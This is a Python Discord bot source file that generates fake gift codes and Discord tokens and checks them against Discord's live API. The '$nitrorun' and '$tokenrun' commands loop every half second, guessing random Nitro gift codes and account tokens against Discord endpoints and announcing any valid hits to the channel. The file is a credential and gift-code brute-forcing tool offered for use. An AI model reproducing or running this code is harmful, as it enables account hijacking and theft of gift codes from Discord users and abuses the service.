#               Made by !MAL#5277
#             Command prefix is = $

'''
The $exampleRUN commands can only be stopped by stopping the bot, if you have low ram the bot will stop generating / overheat. 
'''

import pyfiglet
import discord
from discord.ext import tasks
import random
from requests import get
import string
import requests

token = 'Your_Token'
client = discord.Client()


def g(rolls):
    data = "qwertyuioplkjhgfdsazxcvbnm1234567890QWERTYUIOPLKJHGFDSAZXCVBNM"
    result = ""
    while rolls >= 1:
        c = random.choice(data)
        result = c + result
        rolls = rolls - 1
    return result


chars = "-abcdefghijklmnopq_rstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789"


@client.event
async def on_ready():
    banner = pyfiglet.figlet_format("MAL / Rookie")
    print(banner)

    print("------Logged in as {0.user}------".format(client))


@client.event
async def on_message(message):
    global out

    # Values For dming etc
    user = str(message.author).split('#')[0]
    user_message = str(message.content)
    channel = str(message.channel.name)
    dm = message.author.send
    # Prints All messages (For commands)
    print(f'{user}: {user_message} ({channel})')

    # Checks if the message is the bot
    if message.author == client.user:
        return

    # info/help
    if user_message.lower() == '$help':
        await message.channel.send(f'''
        **COMMANDS**\n**prefix**: $\n**example**: $online\n\n$gen\n$owner\n$online
        ''')
    elif user_message.lower() == '$gen':
        await message.channel.send(f'''
        **GENS**\n**prefix**: $\n**example**: $roblox\n\nRoblox\nminecraft\nnetflix\nxbox\npaypal\nToken\nNitro
        ''')

    # commands
    if user_message.lower() == '$online':
        await message.channel.send(f'I am online {user}')
    elif user_message.lower() == '$owner':
        await message.channel.send(f'**This Bot was created by !Mal#5277**')

    # gen commands
    elif user_message.lower() == '$minecraft':
        out = g(4) + "-" + g(4) + "-" + g(4)
        await message.channel.send(f'Check your dms {user}\n https://discordapp.com/channels/@me/924987374084173844/')
        await message.author.send("Minecraft Unchecked Code: " + out)
    elif user_message.lower() == '$roblox':
        out = g(5) + "-" + g(4) + "-" + g(4)
        await message.channel.send(f'Check your dms {user}\n https://discordapp.com/channels/@me/924987374084173844/')
        await message.author.send("Roblox Unchecked Code: " + out)
    elif user_message.lower() == '$xbox':
        out = g(5) + "-" + g(5) + "-" + g(5) + "-" + g(5) + "-" + g(5)
        await message.channel.send(f'Check your dms {user}\n https://discordapp.com/channels/@me/924987374084173844/')
        await message.author.send("Xbox Unchecked Code: " + out)
    elif user_message.lower() == '$paypal':
        out = g(4) + "-" + g(4) + "-" + g(4)
        await message.channel.send(f'Check your dms {user}\n https://discordapp.com/channels/@me/924987374084173844/')
        await message.author.send("Paypal Unchecked Code: " + out)
    elif user_message.lower() == '$netflix':
        await message.channel.send(f'Check your dms {user}\n https://discordapp.com/channels/@me/924987374084173844/')
        await message.author.send('Netflix unchecked Codes: ' + out)
    elif user_message.lower() == '$token':
        token = random.choice(string.ascii_letters).upper() + random.choice(
            string.ascii_letters).upper() + random.choice(string.ascii_letters) + ''.join(
            random.choice(string.ascii_letters + string.digits) for _ in range(21)) + "." + random.choice(
            string.ascii_letters).upper() + ''.join(
            random.choice(string.ascii_letters + string.digits) for _ in range(5)) + "." + ''.join(
            random.choice(string.ascii_letters + string.digits) for _ in range(27))

        await message.channel.send(f'Check your dms {user}\n https://discordapp.com/channels/@me/924987374084173844/')
        await message.author.send(f'Unchecked Discord Token: ' + token)

    # Nitro Generator
    elif user_message.lower() == '$nitrorun':
        @tasks.loop(seconds=0.5)
        async def myloop():
            # checker
            nitro = ('').join(random.choices(string.ascii_letters + string.digits, k=16))

            url = f"https://discordapp.com/api/v9/entitlements/gift-codes/{nitro}?with_application=false&with_subscription_plan=true"
            response = requests.get(url)  # Get the response from discord

            nitro = "https://discord.gift/" + nitro

            if response.status_code == 200:
                await message.channel.send(f"**Valid** @everyone | {nitro}")
            else:
                await message.channel.send(f"Invalid | {nitro}")

        myloop.start()

    elif user_message.lower() == '$tokenrun':
        @tasks.loop(seconds=0.5)
        async def myloop():
            # Token Gen
            token = random.choice(string.ascii_letters).upper() + random.choice(
                string.ascii_letters).upper() + random.choice(string.ascii_letters) + ''.join(
                random.choice(string.ascii_letters + string.digits) for _ in range(21)) + "." + random.choice(
                string.ascii_letters).upper() + ''.join(
                random.choice(string.ascii_letters + string.digits) for _ in range(5)) + "." + ''.join(
                random.choice(string.ascii_letters + string.digits) for _ in range(27))

            # Token Checker
            response = get('https://discord.com/api/v6/auth/login',
                           headers={"Authorization": token})

            # Checker
            if response.status_code == 200:
                await message.channel.send(f'Valid Token @here | {token}')
                await message.channel.send(f"**Valid** Token @everyone | {token}")
            else:
                await message.channel.send(f'Invalid Token | {token}')

        myloop.start()
    elif user_message.lower() == '$minecraftrun':
        @tasks.loop(seconds=0.5)
        async def myloop():
            out = g(4) + "-" + g(4) + "-" + g(4)
            await message.channel.send(f'Unchecked Minecraft Code: {out}')
        myloop.start()
    elif user_message.lower() == '$robloxrun':
        @tasks.loop(seconds=0.5)
        async def myloop():
            out = g(5) + "-" + g(4) + "-" + g(4)
            await message.channel.send(f'Unchecked Robux Code: {out}')
        myloop.start()
    elif user_message.lower() == '$xboxrun':
        @tasks.loop(seconds=0.5)
        async def myloop():
            out = g(5) + "-" + g(5) + "-" + g(5) + "-" + g(5) + "-" + g(5)
            await message.channel.send(f'Unchecked Xbox Code: {out}')
        myloop.start()
    elif user_message.lower() == '$paypalrun':
        @tasks.loop(seconds=0.5)
        async def myloop():
            out = g(4) + "-" + g(4) + "-" + g(4)
            await message.channel.send(f"Paypal Unchecked Code: {out}")
        myloop.start()
    elif user_message.lower() == '$netflixrun':
        @tasks.loop(seconds=0.5)
        async def myloop():
            out = g(4) + "-" + g(6) + "-" + g(4)
            await message.channel.send(f'Netflix unchecked Codes: {out}')
        myloop.start()
            
client.run(token)